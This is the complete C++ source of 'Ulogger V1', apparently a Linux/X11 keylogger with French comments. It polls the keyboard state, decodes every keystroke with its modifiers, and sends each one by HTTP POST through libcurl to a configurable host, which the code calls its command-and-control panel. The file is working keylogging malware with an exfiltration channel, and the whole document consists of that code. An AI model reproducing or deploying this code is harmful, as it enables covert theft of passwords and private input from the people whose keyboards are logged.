/**
 * Ulogger V1
 * Dev: https://twitter.com/atmon3r
 * Sources: https://framagit.org/tuxicoman/keylogger
 * C++ Keylogger pour Linux avec Xserver.
 * Ce code illustre le fait que chaque application X peut écouter l'ensemble des événements du clavier, même si elle n'a pas le focus.
 *
 * Compile:
 *  g++ -ansi -Wall -Wno-deprecated-declarations -pedantic -O3 -o keylogger keylogger.cpp -L/usr/X11R6/lib -lX11 -lcurl '-DHOST=(char*)"http://localhost/?page=keylog"'
 *
 * Usage:
 * ./keylogger &
 */

#ifndef HOST
   #define HOST "http://localhost/?page=keylog"
#endif


#include <iostream>
#include <algorithm>
#include <string>
#include <sstream>
#include <map>
#include <set>
#include <cstdlib>
#include <csignal>
#include <fstream>
#include <curl/curl.h>

#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <X11/XKBlib.h>

namespace {
  bool cont = true;             // flag for while loop

  Display *display = NULL;         // X server connection

  std::string key_map[256];       // key names
  std::string key_map_upper[256]; // key names, upper case

  std::set<int> caps_set, shift_set, ctrl_set, alt_set, meta_set, altgr_set;

  void quitter(int sig)
  {
    cont = false;
  }

  void fill_mappings()
  {
    /*
     * shorten names of some keys
     */
    const char *const names_map_raw[] = {
      "Caps_Lock",      "",
      "Control_L",      "",
      "Control_R",      "",
      "Shift_L",        "",
      "Shift_R",        "",
      "Alt_L",          "",
      "Alt_R",          "",
      "Meta_L",         "",
      "Meta_R",         "",
      "ISO_Prev_Group", "",
      "ISO_Next_Group", "",
      "ISO_Level3_Shift", "",

      "Home",         "Home",
      "Up",           "Up",
      "Prior",        "Prio",
      "Left",         "Left",
      "Right",        "Right",
      "End",          "End",
      "Down",         "Down",
      "Next",         "Next",
      "Insert",       "Insert",
      "Delete",       "Delete",
      "KP_Home",      "7",
      "KP_Up",        "9",
      "KP_Prior",     "9",
      "KP_Left",      "4",
      "KP_Begin",     "5",
      "KP_Right",     "6",
      "KP_End",       "1",
      "KP_Down",      "2",
      "KP_Next",      "3",
      "KP_Insert",    "0",
      "KP_Delete",    ".",

      "Return",       "Return",
      "KP_Enter",     "Return",
      "Escape",       "Esc",
      "BackSpace",    "Bsp",

      "exclam",       "!",
      "at",           "@",
      "numbersign",   "#",
      "dollar",       "$",
      "percent",      "%",
      "asciicircum",  "^",
      "ampersand",    "&",
      "asterisk",     "*",
      "parenleft",    "(",
      "parenright",   ")",
      "minus",        "-",
      "underscore",   "_",
      "equal",        "=",
      "plus",         "+",
      "bracketleft",  "[",
      "bracketright", "]",
      "braceleft",    "{",
      "braceright",   "}",
      "semicolon",    ";",
      "colon",        ":",
      "apostrophe",   "'",
      "quotedbl",     "\"",
      "grave",        "`",
      "asciitilde",   "~",
      "backslash",    "\\",
      "bar",          "|",
      "comma",        ",",
      "less",         "<",
      "greater",      ">",
      "period",       ".",
      "slash",        "/",
      "question",     "?",
      "space",        " ",
      "KP_0",         "0",
      "KP_1",         "1",
      "KP_2",         "2",
      "KP_3",         "3",
      "KP_4",         "4",
      "KP_5",         "5",
      "KP_6",         "6",
      "KP_7",         "7",
      "KP_8",         "8",
      "KP_9",         "9",
      "KP_Multiply",  "*",
      "KP_Subtract",  "-",
      "KP_Add",       "+",
      "KP_Decimal",   ".",
      "KP_Divide",    "/",

      "eacute", "é",
      "section", "§",
      "egrave", "è",
      "ccedilla", "ç",
      "agrave", "à",

    };

    std::map<std::string, std::string> names_map;

    for (unsigned i = 0; i < sizeof(names_map_raw)/sizeof(const char *); i += 2)
      names_map[names_map_raw[i]] = names_map_raw[i+1];

    /*
     * fill up keyboard mapping
     */
    int min_key_code, max_key_code; // key codes range
    XDisplayKeycodes(display, &min_key_code, &max_key_code);

    for (int code = min_key_code; code <= max_key_code; ++code) {
      const char *keysym  = XKeysymToString(XKeycodeToKeysym(display, code, 0));
      key_map[code]       = keysym ? keysym : "NoSymbol";

      keysym              = XKeysymToString(XKeycodeToKeysym(display, code, 1));
      key_map_upper[code] = keysym ? keysym : "NoSymbol";

      if (key_map[code] == "Caps_Lock")
        caps_set.insert(code);
      else if (key_map[code] == "Shift_L"   || key_map[code] == "Shift_R")
        shift_set.insert(code);
      else if (key_map[code] == "Control_L" || key_map[code] == "Control_R")
        ctrl_set.insert(code);
      else if (key_map[code] == "Alt_L"     || key_map[code] == "Alt_R")
        alt_set.insert(code);
      else if (key_map[code] == "Meta_L"    || key_map[code] == "Meta_R")
        meta_set.insert(code);
      else if (key_map[code] == "ISO_Level3_Shift")
        altgr_set.insert(code);

      std::map<std::string,std::string>::const_iterator loc
        = names_map.find(key_map[code]);
      if (loc != names_map.end())
        key_map[code] = loc->second;

      loc = names_map.find(key_map_upper[code]);
      if (loc != names_map.end())
        key_map_upper[code] = loc->second;
    }
  }
}
// Hack @atmon3r 2018
// Send query to control panel
int sendCC(const char*s)
{
  CURL *curl;
  CURLcode res; 

  curl_global_init(CURL_GLOBAL_ALL);
  curl = curl_easy_init();
  if(curl) {
    curl_easy_setopt(curl, CURLOPT_URL, HOST);
    std::string buf("q=");
    buf += s;
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, buf.c_str());
    res = curl_easy_perform(curl);

    if(res != CURLE_OK)
      fprintf(stderr, "curl_easy_perform() failed: %s\n",
              curl_easy_strerror(res));

    curl_easy_cleanup(curl);
  }
  curl_global_cleanup();
  return 0;
}
 


int main(int argc, const char *const *argv)
{
  // sleep time between keyboard queries (1 ms)
  const timespec sleeptime = { 0, 1000000 };

  // disable C/C++ streams synchronization
  std::ios_base::sync_with_stdio(false);

  /*
   * register signal handler
   */
  if (std::signal(SIGINT, &quitter) == SIG_ERR || std::signal(SIGTERM, &quitter) == SIG_ERR) {
    std::cerr << "Could not register signal handlers.\n";
    std::exit(1);
  }

  /*
   * open the display
   */
  display = XOpenDisplay(getenv("DISPLAY"));

  if (!display)
  {
    std::cerr << "Could not open display.\n";
    std::exit(1);
  }

  /*
   * fill up keyboard mapping
   */
  fill_mappings();

  /*
   * fill relevant key buffers
   */
  char keys[32];                  // buffer for reading keys in
  char lastkeys[32];              // previous keys state

  std::fill(lastkeys, lastkeys + sizeof(lastkeys), 0);


  /*
   * query keyboard in loop
   */
  bool last_is_nav  = false;    // navigation key indicator
  bool last_is_char = false;    // spaces adjustment

  while (cont) {
    nanosleep(&sleeptime, 0);   // avoid busy waiting

    XQueryKeymap(display, keys);

    // read modifiers (caps lock is ignored)
    bool shift = false;
    bool ctrl  = false;
    bool alt   = false;
    bool meta  = false;
    bool altgr = false;

    for (unsigned i = 0; i < sizeof(keys); ++i)
      for (unsigned j = 0, test = 1; j < 8; ++j, test *= 2)
        if (keys[i] & test) {
          const int code = i*8+j;

          if (shift_set.find(code) != shift_set.end())
            shift = true;

          if (ctrl_set.find(code) != ctrl_set.end())
            ctrl = true;

          if (alt_set.find(code) != alt_set.end())
            alt = true;

          if (meta_set.find(code) != meta_set.end())
            meta = true;

          if (altgr_set.find(code) != altgr_set.end())
            altgr = true;
        }

    // print changed keys
    for (unsigned i = 0; i < sizeof(keys); ++i)
      if (keys[i] != lastkeys[i]) {
        // check which key got changed
        for (unsigned j = 0, test = 1; j < 8; ++j, test *= 2)
          // if the key was pressed, and it wasn't before, print this
          if ((keys[i] & test) &&
              ((keys[i] & test) != (lastkeys[i] & test))) {
            const int code = i*8+j;
            std::string key = key_map[code];
            const bool key_is_nav = (key == "Nav");

            // only print navigation keys once
            if (! (last_is_nav && key_is_nav) && key.size() > 0) {
              // change key according to modifiers
              if (! key_is_nav) {
                if (shift)
                  key = key_map_upper[code];

                if (meta)
                  key = "Maj-" + key;

                if (alt)
                  key = "Alt-" + key;

                if (ctrl)
                  key = "Ctrl-" + key;

                if (altgr)
                  key = "AltGr-" + key;
              }

              std::stringstream message;
              switch (key.size())
              {
              case 1:
                message << key;
                last_is_char = (key != "\n");

                break;

              default:
                if (last_is_char) {
                  last_is_char = false;
                }

                message << '[' << key << "]";
                break;
              }
              // std::cout << std::endl << "Keylog:" << message.str() << std::endl;
	     	  sendCC(message.str().c_str()); // Envoie c&c 
              last_is_nav = key_is_nav;
            }
          }

        lastkeys[i] = keys[i];
      }
  }
 

  XCloseDisplay(display);
}
